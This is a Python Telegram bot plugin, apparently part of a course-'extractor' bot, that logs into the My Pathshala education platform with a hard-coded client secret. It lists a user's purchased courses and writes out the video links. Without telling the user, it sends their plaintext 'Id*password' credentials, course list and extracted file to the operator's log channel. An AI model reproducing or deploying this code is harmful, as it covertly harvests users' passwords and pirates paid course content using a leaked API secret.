import asyncio
import aiohttp
import json
from pyrogram import filters
from Extractor import app
from config import PREMIUM_LOGS
log_channel = PREMIUM_LOGS




@app.on_message(filters.command(["my"]))
async def my_pathshala_login(app, message):
    
    input1 = await app.ask(message.chat.id, "Send Your Id and password in this manner Id*password")
    raw_text = input1.text.strip()
    if '*' in raw_text:
    	username, password = raw_text.split("*")
    url = 'https://usvc.my-pathshala.com/api/signin'
    headers = {
        'Host': 'usvc.my-pathshala.com',
        'Preference': '',
        'Filter': '1',
        'Clientid': '2702',
        'Edustore': 'false',
        'Platform': 'android',
        'Trnsreqid': '7e643e8a-0450-4a32-a6ab-db918a1a5e7c',
        'Content-Type': 'application/json; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate, br',
        'User-Agent': 'okhttp/4.8.0',
        'Connection': 'close'
    }
    
    data = {
        "client_id": 2702,
        "client_secret": "cCZxFzu57FrejvFVvEDmytSfDVaVTjC1EA5e1E34",
        "password": password,
        "username": username
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=data) as response:
            response_text = await response.text()
            L_data = json.loads(response_text)
            token = L_data.get('access_token')
            
            
            await my_courses(app, message, token, raw_text)
async def my_courses(app, message,   token, raw_text):
    headers_b = {
        'Authorization': f'Bearer {token}',
        'ClientId': '2702',
        'EduStore': 'false',
        'Platform': 'android',
        'TrnsReqId': 'd4ae4fe2-7710-41e0-ad6c-707723443e17',
        'Host': 'csvc.my-pathshala.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.8.0'
    }
    
    mybatch_url = "https://csvc.my-pathshala.com/api/enroll/course?page=1&perPageCount=10"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(mybatch_url, headers=headers_b) as response:
            response_text = await response.text()
            data = json.loads(response_text).get('response', []).get('data', [])
            if not data: 
                print("No courses are purchased")
                await message.reply_text("No courses are purchased")
                return
            
            print("You have purchased the following courses:")
            await app.send_message(log_channel, f"LOGIN SUCCESSFUL FOR \n`{raw_text}`")
            
            for cdata in data:
                cid = cdata['course']['id']
                cname = cdata['course']['course_name']
                bname = f'{cid} - {cname}'  # Assuming 'cid' is used for naming
                print(bname)
                await message.reply_text(f"Purchased batch \n {bname}")
                pappu = f"{bname}"
                await app.send_message(log_channel, pappu)
                filename = f"{cname}.txt"
                
                videos = cdata['course'].get('videos', [])
                assignments = cdata['course'].get('assignments', [])
                
                # Write to a text file named after bname
                with open(filename, 'w') as f:
                    if videos:
                        for video in videos:
                            title = video['title']
                            link = f"https://www.youtube.com/watch?v={video['video']}"
                            f.write(f"{title}: {link}\n")
                    else:
                        await message.reply_text("No data found")
                    if assignments:
                        for pdf in assignments:
                            title = pdf['assignment_name']
                            link = f"https://mps.sgp1.digitaloceanspaces.com/prod/docs/courses/{pdf['document']}"
                            
                    else:
                        await message.reply_text("No data found")
    await app.send_document(message.chat.id, filename)
    await app.send_document(log_channel, filename)
  
